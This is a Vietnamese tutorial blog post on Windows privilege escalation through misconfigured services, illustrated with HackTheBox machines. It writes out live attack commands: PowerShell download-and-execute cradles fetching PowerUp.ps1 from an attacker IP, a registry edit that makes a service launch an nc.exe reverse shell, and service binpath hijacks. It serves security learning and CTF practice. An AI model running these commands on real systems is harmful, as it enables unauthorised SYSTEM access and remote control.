# Giới thiệu
Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại  
[Leo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights
](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb)  
[Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit
](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd)  
[Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables
](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-2-using-path-variables-3P0lPq6o5ox)  
Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, **Windows**.

Sau một thời gian mình chơi [hackthebox](http://hackthebox.eu/) với khá nhiều machine về Windows, nhận thấy rằng việc khai thác Windows Privilege Escalation có lẽ là khá khác trên Linux vì cấu trúc 2 hệ điều hành khác nhau. Bài viết này mình sẽ bắt đầu từ leo quyền cơ bản nhất đối với Windows để mọi người có thể tiếp cận được một cách dễ dàng nhất. (Hồi mới bắt đầu mình cũng đã khá bối rối với việc leo quyền trên Windows này).

Bài viết này được dựa theo khoá học [Windows Privilege Escalation for OSCP & Beyond!
](https://www.udemy.com/course/windows-privilege-escalation) trên **Udemy** và [Windows / Linux Local Privilege Escalation Workshop
](https://github.com/sagishahar/lpeworkshop) của **sagishahar**.
# Service Exploits
## Unquoted Service Path
### Nguyên nhân
Khi các dịch vụ được tạo mà có đường dẫn thực thi chứa space và không được đặt trong dấu ngoặc kép (đường dẫn tuyệt đối) thì có thể dẫn dến lỗ hổng Unquoted Service Path. Lỗ hổng này cho phép người dùng nhận được các quyền hạn của SYSTEM (chỉ khi vulnerable service đang được cấp quyền SYSTEM ở thời điểm đó). Lỗ hổng này gần giống với lỗ hổng PATH Variable trên Linux.
 
Trong Windows, nếu dịch vụ không đặt trong ngoặc kép và có khoảng trắng (space), nó sẽ xử lý khoảng trắng (space) dưới dạng ngắt dòng lệnh và lấy tất cả các phần còn lại làm đối số.

### Khai thác
Ở trên Windows, khi tạo một tiến trình cho một chương trình (ví dụ chức năng autostart) thì chức năng **CreatProcess** sẽ tạo ra một process mới cùng với luồng của chính nó. Tuy nhiên chúng ta k cần quan tâm đến điều đó lắm, điều quan trọng là chức năng đấy có một cái module xử lý tham số chuỗi **lpApplicationName**. Nó sẽ xử lý đường dẫn đến file được thực thi.

Lấy ví dụ như sau: Một ứng dụng autorun có đường dẫn là `C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe`, tuy nhiên, người quản trị k đặt đường dẫn vào trong ngoặc kép, vậy nên Windows sẽ xử ý chúng theo các bước từ 1 đến 5 như sau:
```
1. C:\Program.exe
2. C:\Program Files\A.exe
3. C:\Program Files\A Subfolder\B.exe
4. C:\Program Files\A Subfolder\B Subfolder\C.exe
5. C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe
```
Mỗi khi gặp khoảng trắng (space), Windows sẽ tự thêm `.exe` vào đuôi để kiểm tra xem chương trình đó có tồn tại để thực thi hay không, nếu không nó sẽ xử lý tiếp đường dẫn cho đến khi nào thực hiện được hoặc hết các bước thì thôi. 

Lỗ hổng được xảy ra từ đây, khi mà user có quyền ghi vào những thư mục kia, và điền 1 đoạn shell thực thi với file `.exe` thì khi hệ thống khởi động lại, Windows sẽ auto khởi động một số dịch vụ đó và nó sẽ vô tình khởi động con shell mà mình tạo nên. Lúc này chúng ta có quyền SYSTEM cao nhất.

Vậy nếu ta có quyền ghi ở thư mục `C:\Program Files\A Subfolder` thì ta tạo 1 file shell tên `B.exe` rồi thực hiện khởi động lại Windows. Khi Windows autostart lại ứng dụng thì nó sẽ thực thi được file `B.exe` và mình có quyền SYSTEM.

Có thể sử dụng câu lệnh tìm kiếm nhanh với powershell như sau
Đầu tiên cần sử dụng chương trình PowerUp.ps1 tại [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) sau đó host lên server của mình rồi chạy lệnh bên dưới để thực thi.
```bash
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted"
```
- **nop**: Viết tắt của NoProfile, nó cho phép PowerShell không thực thi các lệnh của user và ngay lập tức khởi chạy tập lệnh của bạn trong một môi trường không bị ảnh hưởng
- **exec bypass**: Nếu không cho phép thực thi tập lệnh, hãy đảm bảo cho phép nó để chạy tập lệnh powershell này
- **c**: lệnh chạy từ PowerShell

Hoặc có thể sử dụng winPEAS để phát hiện ra lỗi Unquoted Service Path

[![1_30PKDivO2pfHru2iXC3leg.png](https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_30PKDivO2pfHru2iXC3leg.png)](https://0xbadcode.ml/uploads/images/gallery/2020-06/1_30PKDivO2pfHru2iXC3leg.png)

> Ví dụ: [https://youtu.be/b5Tbgl_Nd-g](https://youtu.be/b5Tbgl_Nd-g)

## Weak Registry Permission
### Nguyên nhân
Trên Windows, các service có các registry keys và các keys được đặt tại:
```
HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
```
Nếu user có quyền thấp hơn SYSTEM có FullControl trong bất kỳ dịch vụ nào, trong trường hợp đó, user có thể thay đổi registry này với binary chứa payload độc hại và sẽ được execute bởi service đó
### Khai thác
Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn  
#### Ví dụ: Control (hackthebox)
Sử dụng command sau để kiểm tra xem các dịch vụ mà Hector có FullControl
```
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone"
```
[![1_pKH6cdcpJcrzRcBTgebHow.png](https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_pKH6cdcpJcrzRcBTgebHow.png)](https://0xbadcode.ml/uploads/images/gallery/2020-06/1_pKH6cdcpJcrzRcBTgebHow.png)

Vì có quá nhiều dịch vụ nên tập trung vào một dịch vụ có tên là **wuauserv** là dịch vụ của Windows Updater

Tạo payload
```
reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\temp\nc.exe <ip> <port> -e powershell" /f
```
Tiến hành lắng nghe trên port và khởi động lại dịch vụ **wuauserv**
```
sc.exe start wuauserv
```
hoặc 
```
Start-Service wuauserv
```
[![1_7us7pUKeufCulxiUVMI3Kg.png](https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_7us7pUKeufCulxiUVMI3Kg.png)](https://0xbadcode.ml/uploads/images/gallery/2020-06/1_7us7pUKeufCulxiUVMI3Kg.png)

> Ví dụ 2: [https://youtu.be/TDgQzcjFeME](https://youtu.be/TDgQzcjFeME)
## Weak Service Permissions (Insecure Service Properties)
### Nguyên nhân
Những services được tạo bởi SYSTEM có weak permissions có thể dẫn đến privilege escalation. Nếu một user có quyền thấp hơn nhưng mà lại có thể chỉnh sửa config của services đó, ở đây đang nói đến là thay đổi được `binPath`. Lúc này attacker có thể chỉnh sửa `binPath` dẫn tới một chương trình có chứa payload độc hại và khởi động lại service đó, chương trình độc hại sẽ được thực thi với quyền SYSTEM. Chương trình độc hại có thể chứa payload kết nối ra bên ngoài, attacker lúc này đã có thể sử dụng quyền SYSTEM.

### Khai thác
Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn  
#### Ví dụ: Remote (hackthebox)

Kiểm tra dịch vụ Weak Service Permissions (ngoài PowerUp có thể sử dụng winPEAS cũng có thể phát hiện ra)

`powershell -c "iex(new-object net.webclient).downloadstring('http://10.10.14.91:8888/PowerUp.ps1'); Invoke-AllChecks"`

Kết quả:

![](https://images.viblo.asia/f99faef0-e5a1-463f-a142-92e7060b94fa.png)

Service exploit là **UsoSvc**.

Kéo nc về:

```Powershell
mkdir temp
invoke-webrequest -Uri http://10.10.14.91:8888/nc.exe -OutFile c:\temp\nc.exe
```

Lưu ý cần tạo **/temp/** trước

Tại local tạo file **.bat** như sau:

![](https://images.viblo.asia/a9d37755-768c-474a-ac75-72438b9fe5f1.png)

Kéo nó lên machine:

```Powershell
invoke-webrequest -Uri http://10.10.14.91:8888/connect.bat -OutFile c:\temp\connect.bat
```

Gán binpath cho **UsoSvc**:

```Powershell
sc.exe config UsoSvc binpath= "C:\temp\connect.bat"
```

Listen trên máy local và chạy **UsoSvc**:

```Powershell
sc.exe start UsoSvc
```

Kết quả:

![](https://images.viblo.asia/b72b4284-f392-431e-b177-d7ba39c49b4d.png)
## DLL Hijacking
### Nguyên nhân
Một chương trình Windows sẽ tìm kiếm file DLL khi nó được khởi động. Nếu các DLL này không tồn tại thì có thể nhắm đến và khai thác. Chúng ta có thể tạo 1 file DLL độc hại vào vị trí mà chương trình đó đang tìm kiếm và khởi động, lúc này ta sẽ có quyền của người khởi động chương trình.

Một chương trình Windows sẽ sử dụng các đường dẫn đã được defined từ trước để tìm kiếm các file DLL, và nó sẽ kiểm tra các đường dẫn này theo một thứ tự cụ thể 
1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (first system and then user)

[![1__BXH1Via6L41eMidTvXRdQ.png](https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1__BXH1Via6L41eMidTvXRdQ.png)](https://0xbadcode.ml/uploads/images/gallery/2020-06/1__BXH1Via6L41eMidTvXRdQ.png)

[![MinhTuan-2020-06-09-13-52-52-1067x127.png](https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/MinhTuan-2020-06-09-13-52-52-1067x127.png)](https://0xbadcode.ml/uploads/images/gallery/2020-06/MinhTuan-2020-06-09-13-52-52-1067x127.png)
### Khai thác
Chúng ta có thể sử dụng PowerUp hoặc winPEAS để có thể phát hiện ra lỗ hổng DLL hijacking. Thông thường, chúng ta có thể sư dụng chức năng Write-HijackDll của PowerUp để viết ra một file DLL độc hại và khởi động lại chương trình. Khi chương trình được khởi động, nó sẽ load file DLL độc hại và execute code với quyền cao hơn. 
```
Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
```
Hoặc nếu không muốn sử dụng công cụ thì có thể làm bằng tay theo cách này [https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5](https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5)

Tuy nhiên có thể đây là ngõ cụt nếu bạn có thể tiêm được file DLL nhưng không có cách nào khởi động chương trình như trong bài này [https://0xdf.gitlab.io/2019/06/22/htb-querier.html](https://0xdf.gitlab.io/2019/06/22/htb-querier.html)

Chi tiết hơn kiểu tấn công này có thể đọc tại 
- [https://hacknpentest.com/windows-privilege-escalation-dll-hijacking/](https://hacknpentest.com/windows-privilege-escalation-dll-hijacking/)
- [https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e](https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e)
- [https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456](https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456)

> Ví dụ: [https://youtu.be/9s8jYwx9FSA](https://youtu.be/9s8jYwx9FSA)
## Insecure Service Executables
### Nguyên nhân
Nguyên nhân chính là do SYSTEM cài đặt lên dịch vụ không an toàn (có lỗ hổng) lên machine, attacker có thể khai thác lỗ hổng đó và chiếm được quyền SYSTEM
### Khai thác
Với mỗi service/program thì cách khai thác lại khác nhau. Tuy nhiên mô hình chung chúng ta sẽ đi theo con đường như sau:
- Tìm kiếm dịch vụ nào thú vị (nghi ngờ)
- Kiểm tra xem dịch vụ đó có cách khai thác được public hay chưa (ví dụ như được quyền ghi đè file DLL, thực thi code không cần xác thực, có quyền đối với các thư mục nhất định, ...)
- Thực hiện exploit để thực thi hoặc xem được những thứ cao hơn ...

# Kết luận
Vậy là đã hết phần 1 với series **Windows Privilege Escalation**, nếu có điều gì băn khoăn hay bài viết của mình có điều gì sai sót mọi người comment bên dưới nhé. Cảm ơn tất cả mọi người đã đọc bài viết. Happy hacking!.